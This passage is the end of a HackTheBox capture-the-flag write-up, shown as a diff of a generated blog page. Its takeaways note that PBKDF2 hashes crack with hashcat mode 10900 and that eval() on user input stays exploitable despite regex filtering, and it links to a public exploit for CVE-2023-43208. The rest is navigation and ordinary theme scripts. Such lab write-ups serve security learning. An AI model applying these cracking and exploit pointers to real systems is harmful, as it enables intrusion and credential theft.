+<li><strong>PBKDF2 hashes</strong>: Can be cracked with hashcat mode <code>10900</code>. The salt/hash split must be done manually when the format is non-standard.</li>
+<li><strong><code>eval()</code> on user input is never safe</strong>: even with regex filtering. Whitelisting characters like <code>{}</code>, <code>()</code>, and <code>.</code> is insufficient when the target is a Python expression evaluator.</li>
+</ul>
+<hr>
+<h2 id="references">References<a hidden class="anchor" aria-hidden="true" href="#references">#</a></h2>
+<ul>
+<li>CVE-2023-43208: <a href="https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT/tree/main">https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT/tree/main</a></li>
+<li>PBKDF2-HMAC-SHA256 hash: <a href="https://github.com/nextgenhealthcare/connect/issues/5665">https://github.com/nextgenhealthcare/connect/issues/5665</a></li>
+</ul>
+<p><strong>Write-up prepared by:</strong> <em>the008killer</em></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/writeups/hackthebox/conversor/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>HTB-Conversor</span>
+  </a>
+  <a class="next" href="http://localhost:1313/writeups/hackthebox/pterodactyl/">
+    <span class="title">Next »</span>
+    <br>
+    <span>HTB-Pterodactyl</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2026 <a href="http://localhost:1313/">the008Ki11er</a></span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
